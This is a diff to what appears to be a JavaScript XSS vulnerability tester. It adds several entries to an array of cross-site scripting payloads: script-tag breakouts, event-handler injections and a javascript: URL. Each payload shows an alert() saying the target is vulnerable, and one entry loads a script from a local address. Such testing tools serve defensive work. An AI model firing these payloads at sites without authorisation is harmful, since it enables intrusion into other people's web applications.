@@ -32,6 +32,7 @@ var XSSattack = function(message){
 
 var attackVariants = [
   '><script>alert("You are vulnerable to a Standard XSS attack")</script>',
+  'javascript:alert("You are vulnerable to Non-Standard Javascript XSS attacks")',
   '<a onmouseover="alert(\'You are vulnerable to Broken Tag XSS attacks\')">Injected Element</a>',
   '><<SCRIPT>alert("You are vulnerable to an Extraneous Open Bracket XSS attack");//<</SCRIPT>',
   '></TITLE><SCRIPT>alert("You are vulnerable to a Title Change XSS attack");</SCRIPT>',
@@ -46,7 +47,9 @@ var attackVariants = [
   "'><SCRIPT>alert('You are vulnerable to XSS')</SCRIPT><xss a='",
   '<input onfocus="alert()" autofocus>',
   '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
-  'http://0.0.0.0:8000/non-alpha-xss.js'
+  'http://0.0.0.0:8000/non-alpha-xss.js',
+  '</script><script>alert(You are vulnerable to a Multiple Script Tag XSS attack)</script>',
+  '--><img onload="alert(1)" src="a.gif"/><--'
 ];
 
 $.ajax({
